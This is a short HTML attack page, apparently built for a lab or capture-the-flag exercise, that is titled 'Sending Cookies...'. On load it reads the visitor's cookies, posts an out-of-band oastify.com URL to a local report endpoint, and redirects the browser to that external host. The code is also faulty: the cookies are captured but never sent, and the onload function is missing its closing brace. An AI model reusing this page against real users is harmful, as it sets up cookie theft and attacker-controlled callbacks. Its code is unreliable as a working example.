<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sending Cookie...</title>
    <script>
        window.onload = function() {
            // Capture cookies (if accessible)
            var cookies = document.cookie;
            var targetUrl = "https://8u35fuoj35mz3rvnrbsolyphn8t0hq5f.oastify.com"; // Target URL
            var reportUrl = "http://localhost:5000/report"; // Report endpoint

            // Send a POST request with URL
            fetch(reportUrl, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({ url: targetUrl })
            })
            .then(() => {
                // Redirect after successful request
                window.location.href = targetUrl;
            })
            .catch(error => {
                console.error("Failed to send data:", error);
                window.location.href = targetUrl; // Redirect even if request fails
            });
    </script>
</head>
<body>
    <h1>Sending Cookies...</h1>
    <p>If this page does nothing, <a href="#" onclick="location.reload();">click here</a> to try again.</p>
</body>
</html>
